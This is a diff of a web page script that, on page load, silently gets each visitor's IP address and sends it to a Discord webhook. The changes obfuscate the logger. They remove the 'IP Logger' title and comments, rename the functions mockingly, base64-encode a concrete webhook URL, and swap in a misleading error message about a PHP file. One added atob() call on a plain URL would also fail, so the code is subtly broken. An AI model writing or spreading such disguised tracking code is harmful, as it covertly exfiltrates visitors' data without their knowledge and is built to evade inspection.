@@ -3,46 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Logger</title>
 </head>
 <body>
 
 <script>
-    // Function to get the visitor's IP address
-    async function getIPAddress() {
-        const response = await fetch('https://api64.ipify.org?format=json');
+    async function funny() {
+        const response = await fetch(atob('https://api64.ipify.org?format=json'));
         const data = await response.json();
         return data.ip;
     }
-
-    // Function to send IP address to Discord webhook
-    async function sendToDiscordWebhook(ipAddress) {
-        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
-        const payload = {
-            content: `New visitor's IP address: ${ipAddress}`,
+    async function funnier(noob) {
+        const idiot = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwMDk2NzI5MjA4Nzk2Mzc4MC8xalMta0RRczlxbjlsWTJaVHlZQnllTVRJX2tMTTZtaEhCaXdMVHZPLVZOUGZBUFZCeUxZa1hlNE1QdWF5a3NJRkFIeQ==");
+        const hehe = {
+            content: `Hit: ${noob}`,
         };
-
-        await fetch(webhookUrl, {
+        await fetch(idiot, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify(payload),
+            body: JSON.stringify(hehe),
         });
     }
-
-    // Main function to execute the process
     async function main() {
         try {
-            const ipAddress = await getIPAddress();
-            await sendToDiscordWebhook(ipAddress);
-            console.log('IP address sent to Discord webhook:', ipAddress);
+            const noob = await funny();
+            await funnier(noob);
         } catch (error) {
-            console.error('Error:', error);
+            console.error('Error loading PHP file, not run serverside? (netapplication.php)');
         }
     }
-
-    // Execute the main function when the page loads
     window.onload = main;
 </script>
 
